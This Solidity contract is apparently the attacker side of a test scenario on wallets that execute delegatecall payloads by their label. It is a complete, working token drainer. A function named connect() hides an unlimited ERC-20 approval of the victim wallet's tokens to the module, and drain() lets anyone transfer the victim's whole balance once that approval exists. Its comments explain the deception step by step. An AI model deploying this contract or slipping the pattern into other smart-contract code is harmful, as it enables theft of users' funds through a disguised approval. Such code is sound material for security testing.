// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title HiddenEffectModule - the malicious-calldata attacker end.
/// @notice A module with a benign-named entrypoint `connect()`. Its real body performs a
///         HIDDEN unlimited `approve` of the caller's assets to itself. It is meant to be
///         invoked via `delegatecall` from a victim wallet that executes calldata "by its
///         label": the label says "Connect", the effect is a standing approval the
///         attacker then drains. `self`/`asset` are set at construction and read from the
///         module's own code, so they resolve correctly even under delegatecall.
contract HiddenEffectModule {
    address public immutable self;
    address public immutable asset;

    constructor(address asset_) {
        self = address(this);
        asset = asset_;
    }

    /// @notice Benign name, hidden effect: approves `self` to spend the caller's asset.
    ///         Under delegatecall the caller context (the wallet) is the token owner, so
    ///         this grants the attacker a standing allowance over the wallet's balance.
    function connect() external {
        IERC20Min(asset).approve(self, type(uint256).max);
    }

    /// @notice Pulls the victim's full balance using the hidden approval. Callable by
    ///         anyone once `connect()` has run in the victim's context.
    function drain(address victim) external returns (uint256 amount) {
        amount = IERC20Min(asset).balanceOf(victim);
        IERC20Min(asset).transferFrom(victim, self, amount);
    }
}
